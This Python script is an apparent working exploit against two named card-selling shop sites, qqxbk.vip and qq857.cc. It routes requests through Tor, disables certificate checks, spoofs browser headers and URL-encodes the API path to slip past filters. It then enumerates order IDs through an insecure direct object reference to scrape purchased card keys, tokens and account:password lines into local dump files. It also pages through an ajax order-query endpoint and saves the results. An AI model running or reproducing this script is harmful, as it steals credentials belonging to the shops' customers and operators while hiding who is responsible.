#!/usr/bin/env python3
"""Deep-check batch18: qqxbk open api search IDOR + qq857 ajax200."""
import json
import re
import subprocess
import time
from pathlib import Path

import requests

OUT = Path("/data/recon/batch18")
(OUT / "dump").mkdir(parents=True, exist_ok=True)

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def sess(base: str):
    host = base.split("/")[2]
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Origin": f"https://{host}",
            "Referer": base.rstrip("/") + "/",
            "Accept-Language": "zh-CN,zh;q=0.9",
        }
    )
    return s


def curl61(base: str, qs: str) -> str:
    host = base.split("/")[2]
    b = base.rstrip("/")
    cmd = [
        "curl",
        "-sS",
        "-m",
        "20",
        "-L",
        "-x",
        "socks5h://127.0.0.1:9050",
        "-A",
        UA,
        "-H",
        f"Origin: https://{host}",
        "-H",
        f"Referer: {b}/",
        f"{b}/%61pi.php?{qs}",
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=28)
    return p.stdout or p.stderr or ""


def extract_kami(data) -> list:
    """Pull kami-looking strings from search data payload."""
    out = []
    if data is None:
        return out
    blob = data if isinstance(data, str) else json.dumps(data, ensure_ascii=False)
    # common faka patterns: qq----token / account:pass / long token lines
    for line in re.split(r"<br\s*/?>|\n|\r", blob):
        line = line.strip()
        if not line:
            continue
        if "----" in line or "token" in line.lower() or ":" in line:
            out.append(line)
    if not out and blob.strip() and blob.strip() not in ("{}", "[]", "null"):
        out.append(blob.strip()[:500])
    return out


def dump_qqxbk():
    base = "https://qqxbk.vip"
    log("==== qqxbk.vip api search IDOR ====")
    shapes = {}
    for i in [1, 2, 3, 10, 50, 100, 184, 185, 200, 300]:
        body = curl61(base, f"act=search&id={i}")
        shapes[str(i)] = body[:400]
        log("shape", i, body[:220].replace("\n", " "))
        time.sleep(0.15)
    (OUT / "dump" / "qqxbk_shapes.json").write_text(
        json.dumps(shapes, ensure_ascii=False, indent=2), encoding="utf-8"
    )

    cards = []
    kami_lines = []
    max_id = 250  # orders~184
    for i in range(1, max_id + 1):
        body = curl61(base, f"act=search&id={i}")
        try:
            j = json.loads(body)
        except Exception:
            j = None
        if not isinstance(j, dict):
            if i <= 5:
                log("bad", i, body[:120])
            continue
        data = j.get("data")
        msg = j.get("message") or j.get("msg") or ""
        if data not in (None, "", [], {}):
            kms = extract_kami(data)
            row = {"id": i, "code": j.get("code"), "type": j.get("type"), "status": j.get("status"), "data": data, "kami": kms}
            cards.append(row)
            for k in kms:
                kami_lines.append(f"{i}\t{k}")
            log("CARD", i, "kami=", len(kms), json.dumps(data, ensure_ascii=False)[:220])
        elif j.get("code") == 0 and "不存在" not in str(msg):
            cards.append({"id": i, "raw": j})
            log("ODD", i, body[:200])
        if i % 25 == 0:
            log("progress", i, "cards", len(cards), "kami_lines", len(kami_lines))
            # checkpoint
            (OUT / "dump" / "qqxbk_cards.json").write_text(
                json.dumps(cards, ensure_ascii=False, indent=2), encoding="utf-8"
            )
            (OUT / "dump" / "qqxbk_kami.tsv").write_text(
                "\n".join(kami_lines) + ("\n" if kami_lines else ""), encoding="utf-8"
            )
        time.sleep(0.08)

    (OUT / "dump" / "qqxbk_cards.json").write_text(
        json.dumps(cards, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "dump" / "qqxbk_kami.tsv").write_text(
        "\n".join(kami_lines) + ("\n" if kami_lines else ""), encoding="utf-8"
    )
    stats = {
        "max_id": max_id,
        "cards": len(cards),
        "kami_lines": len(kami_lines),
        "unique_kami": len(set(x.split("\t", 1)[1] for x in kami_lines if "\t" in x)),
    }
    (OUT / "dump" / "qqxbk_stats.json").write_text(
        json.dumps(stats, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("QQXBK TOTAL", stats)
    return stats


def check_qq857():
    base = "https://qq857.cc/shop"
    log("==== qq857.cc ajax query ====")
    s = sess(base)
    s.get(base + "/", timeout=40)
    pages = []
    for page in range(1, 6):
        r = s.get(
            base + f"/ajax.php?act=query&page={page}&limit=50",
            headers={"X-Requested-With": "XMLHttpRequest"},
            timeout=25,
        )
        log("ajax", page, r.status_code, r.text[:220])
        try:
            j = r.json()
            data = j.get("data") if isinstance(j, dict) else None
            n = len(data) if isinstance(data, list) else None
            pages.append({"page": page, "code": r.status_code, "n": n, "isnext": j.get("isnext") if isinstance(j, dict) else None})
            if n:
                (OUT / "dump" / f"qq857_query_p{page}.json").write_text(r.text, encoding="utf-8")
            if isinstance(j, dict) and not j.get("isnext"):
                break
        except Exception as e:
            pages.append({"page": page, "err": str(e), "body": r.text[:200]})
            break
    # confirm search still auth
    body = curl61(base, "act=search&id=1")
    log("qq857 search", body[:180])
    return {"ajax_pages": pages, "search": body[:200]}


def main():
    out = {"kami_found": False, "dumps": {}}
    stats = dump_qqxbk()
    out["dumps"]["qqxbk"] = stats
    if stats.get("kami_lines", 0) > 0:
        out["kami_found"] = True
    out["dumps"]["qq857"] = check_qq857()
    (OUT / "dump" / "DEEP.json").write_text(
        json.dumps(out, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("KAMI", out["kami_found"])
    log("DONE")


if __name__ == "__main__":
    main()
